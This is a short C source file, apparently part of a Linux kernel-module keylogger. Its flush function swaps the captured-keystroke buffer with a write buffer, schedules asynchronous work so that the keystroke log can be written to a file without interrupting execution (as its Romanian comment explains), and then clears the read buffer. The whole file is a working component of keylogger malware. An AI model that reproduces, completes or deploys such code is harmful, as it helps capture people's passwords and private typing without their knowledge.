#include "flush.h"
#define MAX_BUFF_SIZE 1024

void flush(struct KEYLOGGER*keylogger)
{
    char*aux=keylogger->keyboard_read_buffer;
    keylogger->keyboard_read_buffer=keylogger->write_buffer;
    keylogger->write_buffer=aux;

    schedule_work(&keylogger->work_struct); //aceasta functie programeaza o sarcina asincrona pt a putea scrie in fisierul de log fara sa intrerupa executia programului.

    memset(keylogger->keyboard_read_buffer,0,MAX_BUFF_SIZE);
    keylogger->keyboard_read_buffer_offset=0;
}